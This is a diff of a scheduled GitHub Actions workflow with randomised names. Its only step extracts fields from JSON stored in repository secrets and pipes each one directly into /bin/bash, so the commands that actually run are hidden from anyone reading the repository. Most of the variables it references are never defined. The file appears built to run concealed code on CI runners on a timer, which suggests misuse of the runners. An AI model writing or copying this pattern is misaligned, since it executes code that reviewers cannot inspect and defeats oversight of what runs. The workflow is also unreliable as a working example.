@@ -3,25 +3,20 @@ name: pangxifeng5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 1/6 * * *'
-jobs:  # 26025
+    - cron: '9 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: pangxifeng5678
         env:
-          ljvhs280: ${{ secrets.ljvhs280 }}
+          yds64: ${{ secrets.yds64 }}
         run: |
-          echo $ljvhs280 | jq -r .qynnz5404 | /bin/bash
-          echo $kzir66 | jq -r .ixxfp049 | /bin/bash
-          echo $vpyuf3 | jq -r .z626 | /bin/bash
-          echo $mia77065 | jq -r .qab2320 | /bin/bash
-          echo $rzsuo46926 | jq -r .zk9805 | /bin/bash
-          echo $btmkm2687 | jq -r .sfy0 | /bin/bash
-          echo $lbcgr86 | jq -r .tg1 | /bin/bash
-          echo $byirh573 | jq -r .pktv78553 | /bin/bash
-          echo $gomg25428 | jq -r .c088 | /bin/bash
-          echo $w56 | jq -r .ffrch810 | /bin/bash
-          echo $r6803 | jq -r .wekp74 | /bin/bash
+          echo $yds64 | jq -r .aa20 | /bin/bash
+          echo $fida5 | jq -r .lwkyn1360 | /bin/bash
+          echo $kknq1337 | jq -r .ees5 | /bin/bash
+          echo $iymy5 | jq -r .ekmj0 | /bin/bash
+          echo $xd8 | jq -r .wbutx4 | /bin/bash
+          echo $gnvhq744 | jq -r .ezyo36 | /bin/bash
 
